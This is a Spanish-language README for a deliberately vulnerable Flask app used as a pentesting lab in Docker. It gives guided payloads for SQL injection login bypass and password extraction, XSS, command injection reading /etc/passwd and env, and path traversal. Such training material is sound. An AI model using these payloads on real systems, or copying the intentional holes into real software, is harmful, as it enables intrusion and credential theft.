# Lab 5: VulnFlask — Aplicacion Vulnerable Personalizada

> **SOLO PARA ENTORNOS DE LABORATORIO AISLADOS**
> Aplicacion Python con vulnerabilidades intencionales documentadas en el codigo fuente

## Descripcion

Aplicacion Flask con 7 vulnerabilidades intencionales para practicas de pentesting.
Incluye SQLi, XSS, Command Injection, Path Traversal e Information Disclosure.
Corre como root intencionalmente (mala practica a demostrar).

| Propiedad        | Valor                  |
|------------------|------------------------|
| **Imagen base**  | `python:3.11-slim`     |
| **Puerto**       | `5001:5001`            |
| **Base de datos**| SQLite (embebida)      |
| **Framework**    | Flask 3.0              |
| **Corre como**   | root (intencionado)    |

---

## Archivos del Lab

| Archivo            | Descripcion                              |
|--------------------|------------------------------------------|
| `Dockerfile`       | Imagen con herramientas de red y SQLite  |
| `app.py`           | Aplicacion Flask vulnerable              |
| `setup_db.py`      | Script de inicializacion de la BD        |
| `templates/`       | Templates HTML para cada vulnerabilidad  |

---

## Ejecucion

### Paso 1 — Construir y ejecutar

```bash
cd lab5-vulnflask/

# Opcion A: Con Docker Compose
docker compose up -d --build

# Opcion B: Build manual
docker build -t vulnflask:v1 .
docker run -d \
  --name vulnflask-lab5 \
  -p 5001:5001 \
  vulnflask:v1
```

### Paso 2 — Verificar

```bash
docker ps | grep vulnflask
curl http://localhost:5001/health
```

Abrir en navegador: `http://localhost:5001`

---

## Vulnerabilidades para Practicar

| # | Vulnerabilidad       | Ruta        | Payload de ejemplo                                        |
|---|----------------------|-------------|-----------------------------------------------------------|
| 1 | SQL Injection Login  | `/login`    | Usuario: `' OR '1'='1' --`                                |
| 2 | SQL Injection UNION  | `/search?q=`| `' UNION SELECT 1,username,password,email FROM users--`   |
| 3 | XSS Stored           | `/messages` | Mensaje: `<script>alert('XSS')</script>`                  |
| 4 | XSS Reflected        | `/search?q=`| `<img src=x onerror=alert(1)>`                            |
| 5 | Command Injection    | `/ping`     | Host: `127.0.0.1; whoami`                                 |
| 6 | Path Traversal (LFI) | `/readfile` | Archivo: `../../etc/passwd`                                |
| 7 | Info Disclosure      | `/sysinfo`  | Variables de entorno, procesos, kernel                     |

---

## Ejercicios Guiados

### 1. SQL Injection — Bypass de login

```
Ir a: http://localhost:5001/login
Usuario: ' OR '1'='1' --
Password: (cualquier cosa)
Resultado: Acceso al dashboard sin credenciales validas
```

### 2. SQL Injection — Extraer passwords

```
Ir a: http://localhost:5001/search
Buscar: ' UNION SELECT 1,username,password,email FROM users--
Resultado: Se muestran los hashes/passwords de todos los usuarios
```

### 3. Command Injection — Leer archivos del sistema

```
Ir a: http://localhost:5001/ping
Host: 127.0.0.1; cat /etc/passwd
Resultado: Se muestra el contenido de /etc/passwd
```

### 4. Command Injection — Ejecutar comandos arbitrarios

```
Host: 127.0.0.1; whoami
Host: 127.0.0.1 && ls -la /app
Host: 127.0.0.1; env
```

### 5. Path Traversal — Leer archivos sensibles

```
Ir a: http://localhost:5001/readfile
Archivo: ../../etc/passwd
Archivo: ../../app/app.py
Resultado: Se lee cualquier archivo del sistema
```

### 6. XSS Stored — Inyectar JavaScript

```
Ir a: http://localhost:5001/messages
Autor: Atacante
Mensaje: <script>alert('XSS')</script>
Resultado: Cada vez que alguien visite la pagina, se ejecuta el script
```

### 7. Information Disclosure

```
Ir a: http://localhost:5001/sysinfo
Resultado: Variables de entorno, usuario (root), kernel, procesos
```

### 8. Verificar que corre como root

```bash
docker exec vulnflask-lab5 whoami
# Resultado: root

docker exec vulnflask-lab5 id
# Resultado: uid=0(root) gid=0(root)
```

---

## Verificacion

| Prueba              | Comando / URL                         | Resultado esperado       |
|---------------------|---------------------------------------|--------------------------|
| App corriendo       | `curl http://localhost:5001/health`   | JSON status: vulnerable  |
| SQLi funciona       | Login con `' OR '1'='1' --`          | Acceso al dashboard      |
| CMDi funciona       | Ping `127.0.0.1; whoami`             | Muestra `root`           |
| LFI funciona        | Readfile `../../etc/passwd`           | Contenido del archivo    |
| Corre como root     | `docker exec vulnflask-lab5 whoami`  | `root`                   |

---

## Limpieza

```bash
cd lab5-vulnflask/
docker compose down
docker rmi vulnflask:v1 2>/dev/null
docker rmi lab5-vulnflask-vulnflask 2>/dev/null
```
